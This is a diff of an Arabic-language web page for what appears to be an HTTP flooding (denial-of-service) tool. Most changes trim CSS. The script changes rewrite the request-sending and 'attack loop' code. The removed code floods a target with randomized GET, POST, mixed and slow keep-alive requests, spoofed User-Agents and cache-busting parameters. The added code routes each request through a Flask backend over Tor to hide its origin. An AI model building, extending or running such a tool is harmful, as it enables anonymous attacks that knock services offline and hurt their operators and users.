@@ -18,54 +18,33 @@
         }
 
         :root {
-            /* Core Colors - Dark Hacker Theme */
             --bg-deep: #050a0f;
             --bg-primary: #0a0f17;
             --bg-secondary: #0d1520;
             --bg-card: rgba(8, 12, 20, 0.95);
             --bg-glass: rgba(0, 255, 65, 0.03);
             --bg-input: rgba(0, 255, 65, 0.04);
-
-            /* Terminal Colors - Green on Black */
             --green-bright: #00ff41;
             --green-dim: rgba(0, 255, 65, 0.08);
             --green-glow: rgba(0, 255, 65, 0.15);
-            --green-matrix: #00cc33;
-            --green-dark: #003d1a;
-
-            /* Accent Colors */
-            --cyan: #00d4ff;
-            --cyan-dim: rgba(0, 212, 255, 0.06);
-            --magenta: #ff0066;
-            --magenta-dim: rgba(255, 0, 102, 0.06);
             --red: #ff0040;
             --red-dim: rgba(255, 0, 64, 0.08);
             --orange: #ff8800;
             --orange-dim: rgba(255, 136, 0, 0.08);
-
-            /* Grayscale - Terminal Style */
+            --cyan: #00d4ff;
             --text-primary: #00ff41;
             --text-secondary: rgba(0, 255, 65, 0.75);
             --text-tertiary: rgba(0, 255, 65, 0.35);
             --text-muted: rgba(0, 255, 65, 0.12);
             --border-color: rgba(0, 255, 65, 0.08);
-            --border-glow: rgba(0, 255, 65, 0.10);
-
-            /* Typography */
             --font-display: 'Orbitron', monospace;
             --font-terminal: 'Share Tech Mono', monospace;
             --font-body: 'Cairo', sans-serif;
-
-            /* Spacing */
             --radius-sm: 4px;
             --radius-md: 8px;
             --radius-lg: 12px;
-            --radius-xl: 16px;
-
-            /* Transitions */
             --transition-fast: 0.12s cubic-bezier(0.4, 0, 0.2, 1);
             --transition-med: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
-            --transition-slow: 0.5s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
         html,
@@ -78,9 +57,6 @@
             color: var(--text-primary);
         }
 
-        /* ============================================================
-                   MATRIX RAIN EFFECT (Background)
-                ============================================================ */
         .matrix-bg {
             position: fixed;
             inset: 0;
@@ -96,9 +72,6 @@
             height: 100%;
         }
 
-        /* ============================================================
-                   SCROLLBAR - Terminal Style
-                ============================================================ */
         ::-webkit-scrollbar {
             width: 3px;
             height: 3px;
@@ -112,14 +85,11 @@
             box-shadow: 0 0 10px var(--green-glow);
         }
 
-        /* ============================================================
-                   DISCLAIMER OVERLAY - Hacker Style
-                ============================================================ */
         .disclaimer-overlay {
             position: fixed;
             inset: 0;
             z-index: 9999;
-            background: var(--bg-deep);
+            background: rgba(5, 10, 15, 0.96);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -127,25 +97,13 @@
             opacity: 0;
             pointer-events: none;
             transition: opacity 0.5s ease;
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
         }
 
         .disclaimer-overlay.active {
             opacity: 1;
             pointer-events: all;
-        }
-
-        /* Scanline overlay on disclaimer */
-        .disclaimer-overlay::before {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background: repeating-linear-gradient(0deg,
-                    transparent,
-                    transparent 2px,
-                    rgba(0, 255, 65, 0.015) 2px,
-                    rgba(0, 255, 65, 0.015) 4px);
-            pointer-events: none;
-            z-index: 1;
         }
 
         .disclaimer-box {
@@ -154,12 +112,10 @@
             max-height: 90vh;
             overflow-y: auto;
             background: var(--bg-primary);
-            border: 1px solid var(--border-color);
+            border: 1px solid rgba(0, 255, 65, 0.15);
             border-radius: var(--radius-md);
             padding: 40px 36px 32px;
-            box-shadow:
-                0 0 80px rgba(0, 255, 65, 0.04),
-                inset 0 0 80px rgba(0, 255, 65, 0.02);
+            box-shadow: 0 0 80px rgba(0, 255, 65, 0.04);
             animation: terminalSlide 0.5s ease;
             position: relative;
         }
@@ -331,9 +287,6 @@
             box-shadow: 0 0 40px rgba(255, 0, 64, 0.05);
         }
 
-        /* ============================================================
-                   APP CONTAINER
-                ============================================================ */
         .app-container {
             display: none;
             min-height: 100vh;
@@ -348,9 +301,6 @@
             display: flex;
         }
 
-        /* ============================================================
-                   MAIN CARD - Terminal Style
-                ============================================================ */
         .main-card {
             width: 100%;
             max-width: 720px;
@@ -358,15 +308,12 @@
             border-radius: var(--radius-md);
             border: 1px solid var(--border-color);
             padding: 24px 22px 20px;
-            box-shadow:
-                0 0 60px rgba(0, 255, 65, 0.02),
-                inset 0 0 60px rgba(0, 255, 65, 0.01);
+            box-shadow: 0 0 60px rgba(0, 255, 65, 0.02);
             position: relative;
             overflow: hidden;
             transition: var(--transition-med);
         }
 
-        /* Scanline overlay */
         .main-card::before {
             content: '';
             position: absolute;
@@ -381,7 +328,6 @@
             opacity: 0.5;
         }
 
-        /* Ambient glow border animation */
         .main-card::after {
             content: '';
             position: absolute;
@@ -414,9 +360,6 @@
             z-index: 1;
         }
 
-        /* ============================================================
-                   HEADER - Terminal Style
-                ============================================================ */
         .app-header {
             display: flex;
             justify-content: space-between;
@@ -452,10 +395,6 @@
             box-shadow: 0 0 20px rgba(0, 255, 65, 0.05);
         }
 
-        .brand-icon .cursor-blink {
-            animation: blink 1s step-end infinite;
-        }
-
         .brand-text {
             font-family: var(--font-display);
             font-weight: 700;
@@ -467,10 +406,6 @@
 
         .brand-text span {
             color: var(--green-bright);
-        }
-
-        .brand-text .cursor-blink {
-            animation: blink 1s step-end infinite;
         }
 
         .brand-sub {
@@ -516,9 +451,6 @@
             font-size: 12px;
         }
 
-        /* ============================================================
-                   SYSTEM INFO MODAL - Terminal Style
-                ============================================================ */
         .sysinfo-overlay {
             display: none;
             position: fixed;
@@ -648,9 +580,6 @@
             background: var(--green-dim);
         }
 
-        /* ============================================================
-                   TOR STATUS - Terminal Style
-                ============================================================ */
         .tor-status-bar {
             display: flex;
             flex-direction: column;
@@ -804,9 +733,6 @@
             color: var(--red);
         }
 
-        /* ============================================================
-                   STATUS DISPLAY - Terminal Style
-                ============================================================ */
         .status-display {
             padding: 12px 16px;
             border-radius: var(--radius-sm);
@@ -890,9 +816,6 @@
             }
         }
 
-        /* ============================================================
-                   FORM - Terminal Style
-                ============================================================ */
         .form-group {
             margin-bottom: 10px;
         }
@@ -947,9 +870,6 @@
             gap: 10px;
         }
 
-        /* ============================================================
-                   ADVANCED TOGGLE - Terminal Style
-                ============================================================ */
         .adv-toggle {
             display: flex;
             align-items: center;
@@ -1046,9 +966,6 @@
             width: 100%;
         }
 
-        /* ============================================================
-                   BUTTONS - Terminal Style
-                ============================================================ */
         .btn-group {
             display: flex;
             gap: 10px;
@@ -1132,9 +1049,6 @@
             line-height: 1;
         }
 
-        /* ============================================================
-                   STATS - Terminal Style
-                ============================================================ */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
@@ -1207,9 +1121,6 @@
             font-family: var(--font-terminal);
         }
 
-        /* ============================================================
-                   LOG - Terminal Style
-                ============================================================ */
         .log-section {
             margin-top: 12px;
             display: flex;
@@ -1304,22 +1215,26 @@
             color: var(--orange);
         }
 
-        /* ============================================================
-                   TERMINAL CURSOR BLINK UTILITY
-                ============================================================ */
         .cursor-blink {
             animation: blink 1s step-end infinite;
         }
 
-        /* ============================================================
-                   RESPONSIVE
-                ============================================================ */
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            border: 0;
+        }
+
         @media (max-width: 640px) {
             .main-card {
                 padding: 16px 12px 14px;
                 border-radius: var(--radius-sm);
             }
-
             .brand-icon {
                 width: 34px;
                 height: 34px;
@@ -1333,36 +1248,29 @@
                 font-size: 7px;
                 letter-spacing: 2px;
             }
-
             .form-row {
                 grid-template-columns: 1fr;
                 gap: 8px;
             }
-
             .adv-grid {
                 grid-template-columns: 1fr 1fr;
                 gap: 3px 8px;
             }
-
             .stats-grid {
                 grid-template-columns: repeat(2, 1fr);
                 gap: 6px;
             }
-
             .stat-number {
                 font-size: 15px;
             }
-
             .btn-group {
                 flex-direction: column;
                 gap: 6px;
             }
-
             .btn {
                 padding: 10px;
                 font-size: 13px;
             }
-
             .disclaimer-box {
                 padding: 24px 18px 20px;
             }
@@ -1380,7 +1288,6 @@
             .disclaimer-title {
                 font-size: 14px;
             }
-
             .tor-status-bar {
                 padding: 8px 10px;
             }
@@ -1395,20 +1302,17 @@
                 font-size: 8px;
                 padding: 0px 6px;
             }
-
             .status-display {
                 font-size: 12px;
                 padding: 10px 12px;
                 min-height: 38px;
             }
-
             .log-box {
                 max-height: 48px;
                 font-size: 9px;
                 padding: 6px 10px;
                 min-height: 38px;
             }
-
             .sysinfo-box {
                 padding: 20px 16px 16px;
             }
@@ -1422,7 +1326,6 @@
                 text-align: right;
                 font-size: 10px;
             }
-
             .btn-security {
                 padding: 4px 12px;
                 font-size: 10px;
@@ -1430,7 +1333,6 @@
             .btn-security .shield-icon {
                 font-size: 10px;
             }
-
             .tor-proxy-info {
                 font-size: 8px;
                 gap: 6px;
@@ -1474,20 +1376,6 @@
             .header-actions {
                 justify-content: flex-start;
             }
-        }
-
-        /* ============================================================
-                   UTILITY
-                ============================================================ */
-        .sr-only {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            padding: 0;
-            margin: -1px;
-            overflow: hidden;
-            clip: rect(0, 0, 0, 0);
-            border: 0;
         }
     </style>
 </head>
@@ -1578,7 +1466,7 @@
             </div>
             <div class="sysinfo-item" style="border-bottom:none;">
                 <span class="label">المطور</span>
-                <span class="value">CyberShield Labs</span>
+                <span class="value">Fourth Pyramid</span>
             </div>
 
             <button class="sysinfo-close" id="sysinfoClose">[X] إغلاق</button>
@@ -2218,63 +2106,25 @@
             }
 
             // ============================================================
-            // SEND REQUEST
+            // SEND REQUEST - MODIFIED TO USE FLASK BACKEND
             // ============================================================
             async function sendRequest(url) {
-                let fullUrl = url;
-                if (!fullUrl.startsWith('http://') && !fullUrl.startsWith('https://')) {
-                    fullUrl = 'http://' + fullUrl;
-                }
-                fullUrl += `?_=${Date.now()}&r=${Math.random().toString(36).substring(7)}`;
-
-                const headers = {
-                    'User-Agent': getRandomUA(),
-                    'Accept': '*/*',
-                    'Accept-Language': 'ar,en;q=0.9',
-                    'Cache-Control': 'no-cache',
-                    'Pragma': 'no-cache',
-                    'DNT': '1',
-                    'Connection': 'keep-alive'
-                };
-
-                const mode = attackMode.value;
-                let options = {
-                    method: 'GET',
-                    headers: headers,
-                    cache: 'no-cache',
-                    mode: 'cors',
-                    credentials: 'omit',
-                    referrerPolicy: 'no-referrer'
-                };
-
-                if (mode === 'post') {
-                    options.method = 'POST';
-                    options.body = JSON.stringify({ x: Math.random().toString(36) });
-                    headers['Content-Type'] = 'application/json';
-                } else if (mode === 'mixed') {
-                    options.method = Math.random() > 0.5 ? 'POST' : 'GET';
-                    if (options.method === 'POST') {
-                        options.body = JSON.stringify({ x: Math.random().toString(36) });
-                        headers['Content-Type'] = 'application/json';
-                    }
-                } else if (mode === 'slow') {
-                    headers['Connection'] = 'keep-alive';
-                    headers['Keep-Alive'] = 'timeout=9999, max=1000';
-                }
-
-                if (document.getElementById('fingerprintSpoof').checked) {
-                    headers['X-Spoofed'] = '1';
-                }
-
+                // بدل ما نرسل الطلب مباشرة من المتصفح، نرسله للخادم الخلفي (Flask)
+                // عشان يمر عبر Tor (SOCKS5)
                 try {
-                    const ctrl = new AbortController();
-                    const timeout = setTimeout(() => ctrl.abort(), 5000);
-                    options.signal = ctrl.signal;
-                    const resp = await fetch(fullUrl, options);
-                    clearTimeout(timeout);
-                    return { success: true, status: resp.status };
-                } catch {
-                    return { success: false };
+                    const response = await fetch('/api/send-request', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            url: url,
+                            mode: attackMode.value
+                        })
+                    });
+                    const data = await response.json();
+                    return data.success;
+                } catch (e) {
+                    console.error('Error sending request via Flask:', e);
+                    return false;
                 }
             }
 
@@ -2338,7 +2188,7 @@
             }
 
             // ============================================================
-            // ATTACK LOOP
+            // ATTACK LOOP - MODIFIED TO USE THE NEW sendRequest
             // ============================================================
             async function attackLoop() {
                 if (attackLoopRunning) return;
@@ -2390,6 +2240,7 @@
                             if (delay > 0) await new Promise(r => setTimeout(r, delay));
                         }
 
+                        // استخدام الدالة المعدلة التي ترسل الطلب عبر Flask
                         promises.push(sendRequest(target));
                         total++;
                         reqSinceRot++;
@@ -2402,7 +2253,7 @@
 
                     const results = await Promise.allSettled(promises);
                     for (const r of results) {
-                        if (r.status === 'fulfilled' && r.value.success) {
+                        if (r.status === 'fulfilled' && r.value === true) {
                             successTotal++;
                         } else {
                             failTotal++;
@@ -2563,8 +2414,16 @@
             console.log('🛡️ CyberShield Security Suite v3.2.1');
             console.log('🔌 Tor SOCKS5: 127.0.0.1:9050');
             console.log('🌐 HTTP Check: 127.0.0.1:3000');
+            console.log('🔄 تم تعديل الإتصال ليمر عبر Flask + Tor');
 
             updateProxyBadges();
+
+            // تحديث حالة Tor بعد تحميل الصفحة
+            setTimeout(() => {
+                if (isAppEnabled) {
+                    checkTor();
+                }
+            }, 2000);
 
         })();
     </script>
